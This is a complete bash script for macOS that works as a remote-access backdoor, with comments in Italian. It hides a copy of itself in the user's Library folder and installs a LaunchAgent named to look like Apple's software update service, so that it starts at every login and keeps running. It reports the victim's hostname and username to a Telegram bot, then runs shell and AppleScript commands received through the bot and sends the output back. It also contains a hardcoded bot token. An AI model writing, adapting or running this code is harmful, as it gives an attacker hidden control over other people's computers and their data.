#!/bin/bash

# Configurazione
BOT_TOKEN="7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
CHAT_ID="5709299213"
API_URL="https://api.telegram.org/bot${BOT_TOKEN}"
SCRIPT_PATH="$HOME/Library/.hidden_telegram_helper"
LAUNCH_AGENT="$HOME/Library/LaunchAgents/com.apple.softwareupdated.plist"

# Fase 1 - Autoinstallazione
if [ "$1" != "--ghost" ]; then
    # Copia lo script in una posizione nascosta
    cp "$0" "$SCRIPT_PATH"
    chmod +x "$SCRIPT_PATH"
    
    # Crea il launch agent
    cat > "$LAUNCH_AGENT" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.softwareupdated</string>
    <key>ProgramArguments</key>
    <array>
        <string>$SCRIPT_PATH</string>
        <string>--ghost</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>AbandonProcessGroup</key>
    <true/>
</dict>
</plist>
EOF

    # Carica il servizio
    launchctl load -w "$LAUNCH_AGENT" 2>/dev/null
    
    # Avvia la modalità ghost
    exec "$SCRIPT_PATH" --ghost &
    exit 0
fi

# Fase 2 - Modalità operativa
function send_msg {
    curl -s -X POST "${API_URL}/sendMessage" -d "chat_id=${CHAT_ID}&text=$(echo "$1" | sed 's/ /%20/g')" >/dev/null
}

# Notifica iniziale
send_msg "🖥️ $(hostname) - $(whoami) connected (macOS)"

# Loop principale
LAST_UPDATE=0
while true; do
    RESPONSE=$(curl -s "${API_URL}/getUpdates?offset=$((LAST_UPDATE+1))")
    if [ -n "$RESPONSE" ]; then
        UPDATE_ID=$(echo "$RESPONSE" | grep -oE '"update_id":[0-9]+' | tail -1 | cut -d':' -f2)
        COMMAND=$(echo "$RESPONSE" | grep -oE '"text":"[^"]*"' | tail -1 | cut -d'"' -f4)
        
        if [ -n "$UPDATE_ID" ]; then
            LAST_UPDATE=$UPDATE_ID
        fi

        case "$COMMAND" in
            "exit")
                send_msg "❌ Disconnected"
                exit 0
                ;;
            "cmd:"*)
                OUTPUT=$(eval "${COMMAND#cmd:}" 2>&1)
                send_msg "$OUTPUT"
                ;;
            "ps:"*)
                OUTPUT=$(osascript -e "${COMMAND#ps:}" 2>&1)
                send_msg "$OUTPUT"
                ;;
        esac
    fi
    
    # Attesa randomica
    sleep $((RANDOM%10+5))
done
